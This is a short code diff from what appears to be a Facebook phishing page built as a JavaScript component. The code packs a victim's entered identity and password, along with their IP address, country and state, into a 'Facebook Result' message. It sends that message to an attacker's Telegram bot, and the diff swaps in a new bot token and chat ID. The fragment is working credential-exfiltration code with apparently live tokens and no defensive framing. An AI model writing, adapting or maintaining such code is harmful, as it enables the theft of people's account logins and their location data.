@@ -38,8 +38,8 @@ export default function Email() {
                     const PasswordLogin = password;
                     const SubmitValue = `Facebook Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-                    const token = "6986854895:AAGyBEUhIFcSqaNmOrBMjpQigzVMZpMO38g";
-                    const chat_id = -4085217527;
+                    const token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
+                    const chat_id = -4814119425;
                     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
                     let api = new XMLHttpRequest();
